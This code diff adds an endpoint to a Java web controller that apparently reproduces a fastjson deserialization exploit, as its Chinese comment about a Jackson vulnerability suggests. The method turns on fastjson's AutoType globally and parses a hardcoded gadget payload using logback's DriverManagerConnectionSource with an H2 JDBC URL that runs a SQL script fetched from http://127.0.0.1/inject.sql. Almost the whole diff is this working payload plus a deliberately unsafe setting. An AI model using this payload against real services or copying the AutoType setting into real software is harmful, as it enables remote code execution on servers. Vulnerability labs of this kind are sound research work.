@@ -92,4 +92,14 @@ public class WebController {
 		return "success";
 	}
 	
+	//Jackson漏洞影响fastjosn
+	@RequestMapping("jackfastjson")
+	public String jackfastjson()
+	{
+		ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String payload = "{\"@type\":\"ch.qos.logback.core.db.DriverManagerConnectionSource\", \"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1/inject.sql'\"}";
+        JSONObject json = JSON.parseObject(payload);
+        json.toJSONString();
+		return "jack fastjson";
+	}
 }
